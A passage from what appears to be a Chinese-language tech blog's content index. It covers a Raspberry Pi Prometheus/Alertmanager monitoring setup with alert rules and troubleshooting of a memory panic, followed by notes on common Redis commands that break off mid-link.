class=\"attr\">  group_interval:</span> <span class=\"number\">10</span><span class=\"string\">s</span></span><br><span class=\"line\"><span class=\"attr\">  repeat_interval:</span> <span class=\"number\">10</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">  receiver:</span> <span class=\"string\">discord_webhook</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">receivers:</span></span><br><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">'live-monitoring'</span></span><br><span class=\"line\">  <span class=\"comment\">#收邮件的邮箱</span></span><br><span class=\"line\"><span class=\"attr\">  email_configs:</span></span><br><span class=\"line\"><span class=\"attr\">  - to:</span> <span class=\"string\">'your-email@163.com'</span></span><br><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">'discord_webhook'</span></span><br><span class=\"line\"><span class=\"attr\">  webhook_configs:</span></span><br><span class=\"line\"><span class=\"attr\">  - url:</span> <span class=\"string\">'http://192.168.1.203:9094'</span></span><br></pre></td></tr></table></figure></p>\n<p>把一個 exporter 看會不會有任何通知</p>\n<p><strong>這邊注意</strong><br>我用 discord-alertmanager 發現 job_name 不能設定 <code>_</code>樣子<br>導致有時候發送訊息會異常!!<br>這邊要注意一下</p>\n<h2 id=\"接下來學習目標\"><a href=\"#接下來學習目標\" class=\"headerlink\" title=\"接下來學習目標\"></a>接下來學習目標</h2><p>如何設定 alertmanger<br>發現 PromQL 還是有學必要<br>因為設定 alertmanger 必須要會這個東西<br>還有細項動態設定 label …</p>\n<p>先訂好一個大坑</p>\n<ul>\n<li><a href=\"https://codingnote.cc/zh-tw/p/170936/\" target=\"_blank\" rel=\"noopener\">Prometheus監控神器-Rules篇 - ⎝⎛CodingNote.cc ⎞⎠</a></li>\n<li><a href=\"https://blog.beck-yeh.idv.tw/linux/monitor/prometheus-grafana/alertmanager/\" target=\"_blank\" rel=\"noopener\">Alertmanager 紀錄 - 系統工程師 Beck Yeh 的技術分享</a></li>\n<li><a href=\"https://github.com/prometheus/alertmanager/tree/master/template\" target=\"_blank\" rel=\"noopener\">alertmanager/template at master · prometheus/alertmanager · GitHub</a></li>\n</ul>\n<p><a href=\"https://www.itread01.com/content/1545670504.html\" target=\"_blank\" rel=\"noopener\">https://www.itread01.com/content/1545670504.html</a></p>\n<h2 id=\"暫時用的-alertmanager-rule\"><a href=\"#暫時用的-alertmanager-rule\" class=\"headerlink\" title=\"暫時用的 alertmanager rule\"></a>暫時用的 alertmanager rule</h2><p>參考一些規則:<a href=\"https://www.jianshu.com/p/7bec152d1a1f\" target=\"_blank\" rel=\"noopener\">node_exporter 配置 - 簡書</a></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">groups:</span></span><br><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">example</span></span><br><span class=\"line\"><span class=\"attr\">  rules:</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># Alert for any instance that is unreachable for &gt;2 minutes.</span></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">service_down</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">up</span> <span class=\"string\">==</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"attr\">      severity:</span> <span class=\"string\">page</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      summary:</span> <span class=\"string\">\"Instance <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> down\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> of job <span class=\"template-variable\">&#123;&#123; $labels.job &#125;&#125;</span> has been down for more than 2 minutes.\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">磁盤容量小於</span> <span class=\"number\">5</span><span class=\"string\">%</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"number\">100</span> <span class=\"bullet\">-</span> <span class=\"string\">((node_filesystem_avail_bytes&#123;job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"&#125;</span> <span class=\"string\">*</span> <span class=\"number\">100</span><span class=\"string\">)</span> <span class=\"string\">/</span> <span class=\"string\">node_filesystem_size_bytes</span> <span class=\"string\">&#123;job=\"node-exporter\",mountpoint=~\".*\",fstype=~\"ext4|xfs|ext2|ext3\"&#125;)</span> <span class=\"string\">&gt; 95</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      summary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> 磁盤不足 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>磁盤 <span class=\"template-variable\">&#123;&#123; $labels.device &#125;&#125;</span> 資源 已不足 5%, 當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"內存容量小於 20%\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">((node_memory_MemTotal_bytes</span> <span class=\"bullet\">-</span> <span class=\"string\">node_memory_MemFree_bytes</span> <span class=\"bullet\">-</span> <span class=\"string\">node_memory_Buffers_bytes</span> <span class=\"bullet\">-</span> <span class=\"string\">node_memory_Cached_bytes)</span> <span class=\"string\">/</span> <span class=\"string\">(node_memory_MemTotal_bytes</span> <span class=\"string\">))</span> <span class=\"string\">*</span> <span class=\"number\">100</span> <span class=\"string\">&gt; 80</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"attr\">      severity:</span> <span class=\"string\">warning</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      summary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> 內存不足 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>內存資源已不足 20%,當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"CPU 平均負載大於 4 個\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">node_load5</span> <span class=\"string\">&gt; 4</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      sumary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> CPU 負載 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>CPU 平均負載(5 分鐘) 已超過 4 ,當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"磁盤讀 I/O 超過 30MB/s\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">irate(node_disk_read_bytes_total&#123;device=\"sda\"&#125;[1m])</span> <span class=\"string\">&gt; 30000000</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      sumary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> I/O 讀負載 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>I/O 每分鐘讀已超過 30MB/s,當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"磁盤寫 I/O 超過 30MB/s\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">irate(node_disk_written_bytes_total&#123;device=\"sda\"&#125;[1m])</span> <span class=\"string\">&gt; 30000000</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      sumary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> I/O 寫負載 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>I/O 每分鐘寫已超過 30MB/s,當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"網卡流出速率大於 10MB/s\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">(irate(node_network_transmit_bytes_total&#123;device!~\"lo\"&#125;[1m])</span> <span class=\"string\">/</span> <span class=\"number\">1000</span><span class=\"string\">)</span> <span class=\"string\">&gt; 1000000</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      sumary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> 網卡流量負載 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>網卡 <span class=\"template-variable\">&#123;&#123; $labels.device &#125;&#125;</span> 流量已經超過 10MB/s, 當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">\"CPU 使用率大於 90%\"</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"number\">100</span> <span class=\"bullet\">-</span> <span class=\"string\">((avg</span> <span class=\"string\">by</span> <span class=\"string\">(instance,job,env)(irate(node_cpu_seconds_total&#123;mode=\"idle\"&#125;[2m])))</span> <span class=\"string\">*100)</span> <span class=\"string\">&gt; 90</span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    for:</span> <span class=\"number\">2</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">    annotations:</span></span><br><span class=\"line\"><span class=\"attr\">      sumary:</span> <span class=\"string\">\"服務器實例 <span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span> CPU 使用率 告警通知\"</span></span><br><span class=\"line\"><span class=\"attr\">      description:</span> <span class=\"string\">\"<span class=\"template-variable\">&#123;&#123; $labels.instance &#125;&#125;</span>CPU 使用率已超過 90%, 當前值: <span class=\"template-variable\">&#123;&#123; $value &#125;&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  - alert:</span> <span class=\"string\">SSLCertExpiringSoon</span></span><br><span class=\"line\"><span class=\"attr\">    expr:</span> <span class=\"string\">probe_ssl_earliest_cert_expiry&#123;job=\"blackbox\"&#125;</span> <span class=\"bullet\">-</span> <span class=\"string\">time()</span> <span class=\"string\">&lt;</span> <span class=\"number\">86400</span> <span class=\"string\">*</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"attr\">    for:</span> <span class=\"number\">1</span><span class=\"string\">d</span></span><br></pre></td></tr></table></figure>\n<p>最後有看到這個網站有一堆 rule 可以參考<br><a href=\"https://awesome-prometheus-alerts.grep.to/rules.html\" target=\"_blank\" rel=\"noopener\">Awesome Prometheus alerts | Collection of alerting rules</a></p>\n<h2 id=\"2021-04-14-發生問題\"><a href=\"#2021-04-14-發生問題\" class=\"headerlink\" title=\"2021-04-14 發生問題\"></a>2021-04-14 發生問題</h2><p>上 Grafana 看不到 Prometheus 資料<br>看 log 發現<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">prometheus       | level=info ts=2021-04-14T12:32:25.883Z caller=head.go:768 component=tsdb msg=&quot;WAL segment loaded&quot; segment=185 maxSegment=503</span><br><span class=\"line\">prometheus       | panic: runtime error: invalid memory address or nil pointer dereference</span><br><span class=\"line\">prometheus       | [signal SIGSEGV: segmentation violation code=0x1 addr=0xc pc=0x17127f8]</span><br><span class=\"line\">prometheus       |</span><br><span class=\"line\">prometheus       | goroutine 590 [running]:</span><br><span class=\"line\">prometheus       | bufio.(*Writer).Available(...)</span><br><span class=\"line\">prometheus       |      /usr/local/go/src/bufio/bufio.go:624</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb/chunks.(*ChunkDiskMapper).WriteChunk(0x3d39b90, 0x145c, 0x0, 0xcced3c4b, 0x178, 0xcd0878f3, 0x178, 0x26914c4, 0x4712680, 0x0, ...)</span><br><span class=\"line\">prometheus       |      /app/tsdb/chunks/head_chunks.go:291 +0x54c</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).mmapCurrentHeadChunk(0x49bf340, 0x3d39b90)</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:2230 +0x6c</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).cutNewHeadChunk(0x49bf340, 0xcd08b38b, 0x178, 0x3d39b90, 0x0)</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:2204 +0x24</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb.(*memSeries).append(0x49bf340, 0xcd08b38b, 0x178, 0xc1422185, 0x3fe4f164, 0x0, 0x0, 0x3d39b90, 0x10001)</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:2360 +0x3a8</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb.(*Head).processWALSamples(0x3d22120, 0xccd1ba00, 0x178, 0x68a2180, 0x68a2140, 0x0, 0x0)</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:425 +0x270</span><br><span class=\"line\">prometheus       | github.com/prometheus/prometheus/tsdb.(*Head).loadWAL.func5(0x3d22120, 0x416dde0, 0x416ddf0, 0x68a2180, 0x68a2140)</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:519 +0x40</span><br><span class=\"line\">prometheus       | created by github.com/prometheus/prometheus/tsdb.(*Head).loadWAL</span><br><span class=\"line\">prometheus       |      /app/tsdb/head.go:518 +0x268</span><br><span class=\"line\">prometheus       | level=info ts=2021-04-14T12:32:41.305Z caller=main.go:380 msg=&quot;No time or size retention was set so using the default time retention&quot; duration=15d</span><br></pre></td></tr></table></figure></p>\n<p><del>因為我沒有用 healthcheck</del><br>後來沒看到有用的 healthcheck<br>web 介面都正常…</p>\n<p>docker-compose restart 好像都失敗<br>所以<code>docker-compose down -v</code>直接清掉重啟就正常…</p>\n<p>swap 都設2GB<br>RAM 看起來都正常…</p>\n<p>後來我猜測是 Prometheus 問題<br>把 volumes 清掉就正常</p>\n<p><a href=\"https://github.com/prometheus/prometheus/issues/8661\" target=\"_blank\" rel=\"noopener\">rpi4 docker panic: mmap, size 134217728: cannot allocate memory · Issue #8661 · prometheus/prometheus · GitHub</a><br><del>後來我有找到這個跟我一樣問題</del><br><del>我目前估計用docker-compose up 執行是跑舊版</del><br><del>後來我跑最新版</del><br><del>但是我沒清掉 volumes 關係?(忘記)</del><br><del>看似 issue 問題也是升級問題</del><br><del>但我是跑到第五天才遇到問題</del><br><del>麻煩的是 alertmanager 沒發通知</del><br><del>很容易沒注意到</del><br>確定我過5天後又發生問題</p>\n<p>這邊當初我應該不用下<code>docker-compose down -v</code><br>應該先 <code>docker-compose stop prometheus</code><br><code>docker volume rm (volume_name)</code>才對</p>\n<p><strong>2021-04-25</strong></p>\n<p>最近又遇到這個問題<br>查了一下，可能跟 Raspberry PI OS 32 位元有關係<br>聽說64 位元能解決?!(不確定)<br>參考:</p>\n<ul>\n<li><a href=\"https://github.com/prometheus/prometheus/issues/7483\" target=\"_blank\" rel=\"noopener\">Compaction running out of memory · Issue #7483 · prometheus/prometheus · GitHub</a></li>\n<li><a href=\"https://github.com/prometheus/prometheus/issues/7450\" target=\"_blank\" rel=\"noopener\">3G memory free yet still panic: mmap: cannot allocate memory · Issue #7450 · prometheus/prometheus · GitHub</a></li>\n<li><a href=\"https://github.com/prometheus/prometheus/issues/4392\" target=\"_blank\" rel=\"noopener\">mmap: cannot allocate memory · Issue #4392 · prometheus/prometheus · GitHub</a></li>\n<li><a href=\"https://github.com/prometheus-operator/prometheus-operator/issues/3725#issuecomment-741820940\" target=\"_blank\" rel=\"noopener\">any way to disable sync prometheus configuration? · Issue #3725 · prometheus-operator/prometheus-operator · GitHub</a></li>\n</ul>\n<blockquote>\n<p>Had the same problem. Fixed it by adding a size limit for the storage with –storage.tsdb.retention.size=500MB.<br>Maybe on 32bit systems there could be a default/maximum value for storage.tsdb.retention.size, along with the warning.<br><a href=\"https://github.com/prometheus/prometheus/issues/7483#issuecomment-670512677\" target=\"_blank\" rel=\"noopener\">https://github.com/prometheus/prometheus/issues/7483#issuecomment-670512677</a></p>\n</blockquote>\n<p><del>這個我還沒測試</del><br>2021-05-03 測試中</p>\n<blockquote>\n<p>   Raspberry PI 3 B+<br>   Raspbian Stretch Lite October 2018<br>   prometheus, version 2.4.3+ds (branch: debian/sid, revision: 2.4.3+ds-2) installed from armhf deb package (<a href=\"https://packages.debian.org/sid/net/prometheus\" target=\"_blank\" rel=\"noopener\">https://packages.debian.org/sid/net/prometheus</a>) (so I guess no 64bit on 32bit)<br>   –storage.tsdb.retention=15y –storage.tsdb.min-block-duration=2h –storage.tsdb.max-block-duration=2h but problem also appears on default settings of min/max block durations.<br><a href=\"https://github.com/prometheus/prometheus/issues/4392#issuecomment-433717839\" target=\"_blank\" rel=\"noopener\">https://github.com/prometheus/prometheus/issues/4392#issuecomment-433717839</a></p>\n</blockquote>\n<p><a href=\"https://vitzhou.top/20180328_prometheus_config/\" target=\"_blank\" rel=\"noopener\">Prometheus命令</a></p>\n<p><del>目前使用這個方案觀察看看</del><br>2021-05-03 確定跑到後面會出問題</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">prometheus:</span></span><br><span class=\"line\"><span class=\"attr\">  image:</span> <span class=\"string\">prom/prometheus-linux-armv7</span></span><br><span class=\"line\"><span class=\"attr\">  container_name:</span> <span class=\"string\">prometheus</span></span><br><span class=\"line\"><span class=\"attr\">  restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">  volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">$PWD/prometheus/:/etc/prometheus/</span></span><br><span class=\"line\"><span class=\"attr\">    - prometheus_data:</span><span class=\"string\">/prometheus</span></span><br><span class=\"line\"><span class=\"attr\">  command:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--config.file=/etc/prometheus/prometheus.yml'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--storage.tsdb.path=/prometheus'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--web.console.libraries=/usr/share/prometheus/console_libraries'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--web.console.templates=/usr/share/prometheus/consoles'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--storage.tsdb.retention=90d'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--storage.tsdb.min-block-duration=2h'</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'--storage.tsdb.max-block-duration=2h'</span></span><br><span class=\"line\"><span class=\"attr\">  networks:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">monitoring</span></span><br><span class=\"line\"><span class=\"attr\">  links:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">alertmanager</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">cadvisor</span></span><br><span class=\"line\"><span class=\"attr\">  expose:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">'9090'</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"number\">9090</span><span class=\"string\">:9090</span></span><br><span class=\"line\"><span class=\"attr\">  depends_on:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">cadvisor</span></span><br></pre></td></tr></table></figure>\n"},{"title":"Redis 小記","url":"/blog/2020/02/17/Redis-%E5%B0%8F%E8%A8%98/","content":"<p>常常專案使用 redis<br>但並沒有深入了解<br>因為 Redis 一般看範例就知道怎麼使用了<br>真的非常簡單<br>但我覺得用那麼多次<br>沒深入了解不是很好<br>這篇整理一下</p>\n<a id=\"more\"></a>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><p>上一篇是用 ansible 安裝 redis<br>這篇就不做了…</p>\n<p>其個更快的話可以用 <code>apt install redis-server</code></p>\n<h2 id=\"Redis-一般常用類型\"><a href=\"#Redis-一般常用類型\" class=\"headerlink\" title=\"Redis 一般常用類型\"></a>Redis 一般常用類型</h2><ol>\n<li>String (最大可存 512 MB)</li>\n<li>Hash</li>\n<li>List</li>\n<li>Map</li>\n<li>Sorted Map(zmap)</li>\n</ol>\n<h2 id=\"一般常用指令\"><a href=\"#一般常用指令\" class=\"headerlink\" title=\"一般常用指令\"></a>一般常用指令</h2><h3 id=\"keys\"><a href=\"#keys\" class=\"headerlink\" title=\"keys *\"></a>keys *</h3><p>一般線上不會用這個指令，好像會有阻塞的可能。</p>\n<h3 id=\"dbsize\"><a href=\"#dbsize\" class=\"headerlink\" title=\"dbsize\"></a>dbsize</h3><p>回傳 <code>key</code> 的數量。</p>\n<h3 id=\"exists\"><a href=\"#exists\" class=\"headerlink\" title=\"exists\"></a>exists</h3><p>查詢 <code>key</code> 是否存在。</p>\n<p>return 1 存在，0 不存在</p>\n<h3 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h3><p>刪除 key</p>\n<h3 id=\"expire\"><a href=\"#expire\" class=\"headerlink\" title=\"expire\"></a>expire</h3><p>設定 key 結束時間</p>\n<h3 id=\"ttl\"><a href=\"#ttl\" class=\"headerlink\" title=\"ttl\"></a>ttl</h3><p>查看 key 剩餘時間</p>\n<p>-1 沒有限制<br>-2 沒有 key 存在</p>\n<h3 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h3><p>查看 key 的類型</p>\n<h3 id=\"incr\"><a href=\"#incr\" class=\"headerlink\" title=\"incr\"></a>incr</h3><p>會把 key 的 value 加 1</p>\n<p>這個是 redis 適合做計數器</p>\n<h2 id=\"類型相關指令\"><a href=\"#類型相關指令\" class=\"headerlink\" title=\"類型相關指令\"></a>類型相關指令</h2><h3 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h3><h4 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h4><p>set </p>\n<p>四個 option</p>\n<h4 id=\"setex\"><a href=\"#setex\" class=\"headerlink\" title=\"setex\"></a>setex</h4><p>setex key second value</p>\n<p>跟<br>set key value<br>expire key second<br>一樣動作</p>\n<p>set key value ex second</p>\n<h4 id=\"setnx\"><a href=\"#setnx\" class=\"headerlink\" title=\"setnx\"></a>setnx</h4><p>key 不存在才做設定值</p>\n<h4 id=\"mset\"><a href=\"#mset\" class=\"headerlink\" title=\"mset\"></a>mset</h4><p>mset key1 value1 key2 value2</p>\n<p>可以多個設定值</p>\n<p>一般 set<br>n次set時間=n次網路時間+n次命令<br>但是 mset 只需要一次網路時間<br>mset時間=<code>1</code>次網路時間+n次命令</p>\n<h4 id=\"mget\"><a href=\"#mget\" class=\"headerlink\" title=\"mget\"></a>mget</h4><p>跟 mset 與 set 關係差不多<br>如上。</p>\n<p>找不到會回傳 nil(null)</p>\n<h4 id=\"append\"><a href=\"#append\" class=\"headerlink\" title=\"append\"></a>append</h4><p>append key value</p>\n<p>會在 value 值後面加入新 value 值<br>就算不存在也不會有問題</p>\n<h4 id=\"strlen\"><a href=\"#strlen\" class=\"headerlink\" title=\"strlen\"></a>strlen</h4><p>key 的 value 長度<br>沒資料的話，回傳 0</p>\n<h4 id=\"getset\"><a href=\"#getset\" class=\"headerlink\" title=\"getset\"></a>getset</h4><p>getset key value<br>回傳值是舊值</p>\n<h3 id=\"Hash\"><a href=\"#Hash\" class=\"headerlink\" title=\"Hash\"></a>Hash</h3><h4 id=\"hset\"><a href=\"#hset\" class=\"headerlink\" title=\"hset\"></a>hset</h4><p>hset key field value</p>\n<p>hset user:1 name josh</p>\n<h4 id=\"hget\"><a href=\"#hget\" class=\"headerlink\" title=\"hget\"></a>hget</h4><p>hget key field</p>\n<p>hget user:1 name</p>\n<h4 id=\"hsetnx\"><a href=\"#hsetnx\" class=\"headerlink\" title=\"hsetnx\"></a>hsetnx</h4><p>hsetnx key field value</p>\n<h4 id=\"hdel\"><a href=\"#hdel\" class=\"headerlink\" title=\"hdel\"></a>hdel</h4><p>hdel 刪除 key 的 field</p>\n<h4 id=\"hlen\"><a href=\"#hlen\" class=\"headerlink\" title=\"hlen\"></a>hlen</h4><p>hlen 抓取 key 的長度</p>\n<h4 id=\"hkeys\"><a href=\"#hkeys\" class=\"headerlink\" title=\"hkeys\"></a>hkeys</h4><p>這邊 hkeys 跟 key 完全沒有關係<br>列出 key 裡面的 field</p>\n<h4 id=\"hmset-hmget\"><a href=\"#hmset-hmget\" class=\"headerlink\" title=\"hmset,hmget\"></a>hmset,hmget</h4><p>hmset key field1 value1 field2 value2 …</p>\n<h4 id=\"hexist\"><a href=\"#hexist\" class=\"headerlink\" title=\"hexist\"></a>hexist</h4><p>hmget key field1 filed2 …</p>\n<h4 id=\"hvals\"><a href=\"#hvals\" class=\"headerlink\" title=\"hvals\"></a>hvals</h4><p>hvals key </p>\n<h4 id=\"hgetall\"><a href=\"#hgetall\" class=\"headerlink\" title=\"hgetall\"></a>hgetall</h4><p>hgetall 會把所有field,value抓出來。<br>老實說我還不知道這個能做什麼?<br>會阻塞，可以使用 hscan 代替</p>\n<h4 id=\"hstrlen\"><a href=\"#hstrlen\" class=\"headerlink\" title=\"hstrlen\"></a>hstrlen</h4><p>抓取 key field 長度</p>\n<h4 id=\"hincrby\"><a href=\"#hincrby\" class=\"headerlink\" title=\"hincrby\"></a>hincrby</h4><p>hincrby key field 1<br>回傳累加值</p>\n<h4 id=\"hincrbyfloat\"><a href=\"#hincrbyfloat\" class=\"headerlink\" title=\"hincrbyfloat\"></a>hincrbyfloat</h4><p>hincrbyfloat key filed<br>回傳累加值</p>\n<h3 id=\"List\"><a href=\"#List\" class=\"headerlink\" title=\"List\"></a>List</h3><h4 id=\"lpush\"><a href=\"#lpush\" class=\"headerlink\" title=\"lpush\"></a>lpush</h4><p>lpush  key value</p>\n<p>l =&gt; left<br>在 list 左邊加入 value</p>\n<h4 id=\"rpush\"><a href=\"#rpush\" class=\"headerlink\" title=\"rpush\"></a>rpush</h4><p>r =&gt; right<br>同上，但家在右邊 list</p>\n<h4 id=\"lpop\"><a href=\"#lpop\" class=\"headerlink\" title=\"lpop\"></a>lpop</h4><p>l =&gt; left<br>移除(拿出) 左邊 list 的 value</p>\n<h4 id=\"rpop\"><a href=\"#rpop\" class=\"headerlink\" title=\"rpop\"></a>rpop</h4><p>同上，是右邊</p>\n<h4 id=\"llen\"><a href=\"#llen\" class=\"headerlink\" title=\"llen\"></a>llen</h4><p>llen list(key)</p>\n<h4 id=\"lrem\"><a href=\"#lrem\" class=\"headerlink\" title=\"lrem\"></a>lrem</h4><p>lrem list(key) count value </p>\n<blockquote>\n<p>根據參數 count 的值，移除列表中與參數 value 相等的元素。<br>count 的值可以是以下幾種：<br>    count &gt; 0 : 從表頭開始向表尾搜索，移除與 value 相等的元素，數量為 count 。<br>    count &lt; 0 : 從表尾開始向表頭搜索，移除與 value 相等的元素，數量為 count 的絕對值。<br>    count = 0 : 移除表中所有與 value 相等的值。</p>\n</blockquote>\n<p><a href=\"http://redisdoc.com/list/lrem.html\" target=\"_blank\" 